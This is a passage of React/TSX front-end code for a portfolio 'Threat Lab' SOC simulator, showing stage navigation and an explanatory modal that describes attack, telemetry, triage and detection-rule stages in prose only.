                            {current.stages.defense.hardeningTips.map((tip, i) => (
                              <li key={i} className="flex items-start gap-2">
                                <span className="text-accent font-bold">→</span>
                                <span className="leading-relaxed">{tip}</span>
                              </li>
                            ))}
                          </ul>
                        </div>
                      </div>
                    </div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Bottom Stage Progress Footer */}
          <div className="px-5 py-3 border-t border-line bg-surface-muted flex items-center justify-between font-mono text-xs">
            <span className="text-dim">
              PIPELINE PROGRESS: <span className="text-text font-bold">STAGE 0{activeStage} / 04</span>
            </span>

            <div className="flex items-center gap-2">
              <button
                type="button"
                disabled={activeStage === 1}
                onClick={() => setActiveStage((p) => Math.max(1, p - 1) as Stage)}
                className="px-2.5 py-1 rounded-sm border border-line text-muted hover:text-text disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                Previous
              </button>
              <button
                type="button"
                disabled={activeStage === 4}
                onClick={() => setActiveStage((p) => Math.min(4, p + 1) as Stage)}
                className="px-2.5 py-1 rounded-sm bg-accent/15 border border-accent text-accent font-semibold hover:bg-accent/25 disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                Next Stage →
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* UNDERSTAND THREAT LAB MODAL */}
      <AnimatePresence>
        {showUnderstandModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-6 overflow-y-auto">
            {/* Backdrop */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowUnderstandModal(false)}
              className="fixed inset-0 bg-black/75 backdrop-blur-sm cursor-pointer"
            />

            {/* Modal Dialog Card */}
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 15 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 15 }}
              transition={{ duration: 0.25, ease: "easeOut" }}
              className="relative w-full max-w-3xl rounded-md bg-panel border-2 border-accent/50 shadow-[0_20px_60px_rgba(0,0,0,0.65)] overflow-hidden z-10 flex flex-col max-h-[90vh]"
            >
              {/* Modal Header */}
              <div className="panel-header px-5 py-4 flex items-center justify-between border-b border-line bg-surface shrink-0">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-sm bg-accent/15 border border-accent/40 flex items-center justify-center text-accent">
                    <BookOpen size={16} />
                  </div>
                  <div>
                    <h3 className="font-mono text-sm sm:text-base font-bold text-text flex items-center gap-2">
                      <span>Understand Threat Lab</span>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded-sm border border-accent/40 bg-accent/10 text-accent font-semibold">
                        SOC BRIEFING
                      </span>
                    </h3>
                    <p className="font-mono text-[11px] text-muted">
                      Complete architectural guide to attack simulation, telemetry, and detection engineering
                    </p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => setShowUnderstandModal(false)}
                  className="w-8 h-8 rounded-sm border border-line text-muted hover:text-text hover:border-line/80 flex items-center justify-center transition-colors cursor-pointer"
                  aria-label="Close modal"
                >
                  <X size={16} />
                </button>
              </div>

              {/* Modal Scrollable Body */}
              <div className="p-5 sm:p-6 overflow-y-auto space-y-6 font-mono text-xs text-muted">
                {/* 1. What is Threat Lab? */}
                <div className="p-4 rounded-sm bg-surface-light border border-line">
                  <span className="text-accent text-[11px] font-bold uppercase tracking-wider block mb-1">
                    01 // PURPOSE & OVERVIEW
                  </span>
                  <p className="text-text font-semibold text-xs leading-relaxed">
                    Threat Lab is an interactive cyber defense simulator designed to show how real-world enterprise attacks occur, how endpoint sensors capture them in forensic logs, and how a SOC Analyst investigates and authors detection rules to stop them.
                  </p>
                  <p className="mt-2 text-muted text-[11px] leading-relaxed">
                    Rather than presenting theoretical claims, this lab provides verifiable proof across the entire incident response lifecycle: <span className="text-accent font-semibold">Adversary TTPs (MITRE ATT&CK)</span> &rarr; <span className="text-amber font-semibold">Raw OS Telemetry</span> &rarr; <span className="text-blue font-semibold">SOC Incident Triage</span> &rarr; <span className="text-accent font-semibold">Production Sigma / Wazuh Rules</span>.
                  </p>
                </div>

                {/* 2. The 4-Stage Security Pipeline */}
                <div>
                  <span className="text-dim text-[10px] uppercase tracking-wider font-bold block mb-3">
                    02 // THE 4-STAGE ATTACK & DEFENSE LIFECYCLE
                  </span>

                  <div className="grid sm:grid-cols-2 gap-3">
                    {/* Stage 1 */}
                    <div className="p-3.5 rounded-sm bg-surface-light border border-red/30">
                      <div className="flex items-center gap-2 mb-1.5">
                        <Terminal size={14} className="text-red" />
                        <span className="font-bold text-red text-xs">STAGE 01: [ATTACK]</span>
                      </div>
                      <p className="text-[11px] text-muted leading-relaxed">
                        <strong className="text-text">What Happens:</strong> The Red Team adversary executes live commands and payloads (e.g., hidden Base64 PowerShell in-memory loader or Hydra SSH dictionary brute-force).
                      </p>
                      <span className="inline-block mt-2 text-[10px] text-red/90 bg-red/10 px-1.5 py-0.5 rounded border border-red/20 font-semibold">
                        Focus: Adversary TTPs & MITRE ATT&CK
                      </span>
                    </div>

                    {/* Stage 2 */}
                    <div className="p-3.5 rounded-sm bg-surface-light border border-amber/30">
                      <div className="flex items-center gap-2 mb-1.5">
                        <Radio size={14} className="text-amber" />
                        <span className="font-bold text-amber text-xs">STAGE 02: [TELEMETRY]</span>
                      </div>
                      <p className="text-[11px] text-muted leading-relaxed">
                        <strong className="text-text">What Happens:</strong> Endpoint sensors (Windows Sysmon Event ID 1 & 10 or Linux auth.log) record raw forensic evidence, capturing parent-child processes, CLI arguments, and memory access.
                      </p>
                      <span className="inline-block mt-2 text-[10px] text-amber/90 bg-amber/10 px-1.5 py-0.5 rounded border border-amber/20 font-semibold">
                        Focus: Raw JSON Evidence & Hashes
                      </span>
                    </div>

                    {/* Stage 3 */}
                    <div className="p-3.5 rounded-sm bg-surface-light border border-blue/30">
                      <div className="flex items-center gap-2 mb-1.5">
                        <ShieldAlert size={14} className="text-blue" />
                        <span className="font-bold text-blue text-xs">STAGE 03: [SOC TRIAGE]</span>
                      </div>
                      <p className="text-[11px] text-muted leading-relaxed">
                        <strong className="text-text">What Happens:</strong> A high-priority SIEM correlation alert triggers. The SOC analyst verifies the incident ticket, calculates the severity score (9.4/10), and assesses the blast radius.
                      </p>
                      <span className="inline-block mt-2 text-[10px] text-blue/90 bg-blue/10 px-1.5 py-0.5 rounded border border-blue/20 font-semibold">
                        Focus: Threat Triage & Blast Radius
                      </span>
                    </div>

                    {/* Stage 4 */}
                    <div className="p-3.5 rounded-sm bg-surface-light border border-accent/30">
                      <div className="flex items-center gap-2 mb-1.5">
                        <CheckCircle2 size={14} className="text-accent" />
                        <span className="font-bold text-accent text-xs">STAGE 04: [DEFENSE RULES]</span>
                      </div>
                      <p className="text-[11px] text-muted leading-relaxed">
                        <strong className="text-text">What Happens:</strong> To permanently detect and block this attack, production-ready <span className="text-accent">Sigma Rules (YAML)</span> and <span className="text-accent">Wazuh Rules (XML)</span> are authored, alongside system hardening playbooks.
                      </p>
                      <span className="inline-block mt-2 text-[10px] text-accent/90 bg-accent/10 px-1.5 py-0.5 rounded border border-accent/20 font-semibold">
                        Focus: Detection Engineering & Hardening
                      </span>
                    </div>
                  </div>
                </div>

                {/* 3. Interactive Controls Cheatsheet */}
                <div className="p-4 rounded-sm bg-surface-light border border-line">
                  <span className="text-dim text-[10px] uppercase tracking-wider font-bold block mb-2">
                    03 // CONTROLS & HOW TO USE
                  </span>

                  <ul className="space-y-2 text-[11px] text-muted">
                    <li className="flex items-start gap-2">
                      <span className="text-accent font-bold">1. Scenario Selector:</span>
                      <span>Switch between <strong>Encoded PowerShell</strong> (Windows memory dump) and <strong>SSH Brute-Force</strong> (Linux sudo abuse) from the top bar.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-accent font-bold">2. Auto-Run Incident:</span>
                      <span>Click once to watch the entire attack and defense cycle automatically progress at a 3.2-second interval.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-accent font-bold">3. 3D Depth Toggle:</span>
                      <span>Switch between an isometric 3D perspective workstation view and a standard flat mode.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-accent font-bold">4. Copy Detection Rules:</span>
                      <span>Go to Stage 04 to copy ready-to-deploy Sigma YAML or Wazuh XML rules directly to your clipboard.</span>
                    </li>
                  </ul>
                </div>

                {/* 4. Recruiter Value */}
                <div className="p-3.5 rounded-sm bg-accent/5 border border-accent/30 flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2">
                    <Sparkles size={16} className="text-accent shrink-0" />
                    <span className="text-[11px] text-text font-semibold">
                      Built to provide verifiable, hands-on proof of Tier-1 and Tier-2 SOC Analyst capabilities to technical hiring leads.
                    </span>
                  </div>
                  <span className="shrink-0 text-[10px] font-mono text-accent font-bold border border-accent/40 bg-accent/10 px-2 py-0.5 rounded-sm">
                    BLUE TEAM RIGOR
                  </span>
                </div>
              </div>

              {/* Modal Footer */}
              <div className="px-5 py-3.5 border-t border-line bg-surface-muted flex items-center justify-between shrink-0">
                <span className="text-dim text-[11px] font-mono">
                  Press <kbd className="px-1.5 py-0.5 rounded bg-surface border border-line text-text">ESC</kbd> or click outside to close
                </span>

                <button
                  type="button"
                  onClick={() => {
                    setShowUnderstandModal(false);
                    setActiveStage(1);
                    setIsSimulating(true);
                  }}
                  className="inline-flex items-center gap-1.5 px-4 py-1.5 rounded-sm bg-accent text-[#06120c] font-mono text-xs font-bold hover:bg-accent/90 transition-colors shadow-sm cursor-pointer"
                >
                  <span>Launch Simulation</span>
                  <ArrowRight size={13} />
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </section>
  );
}
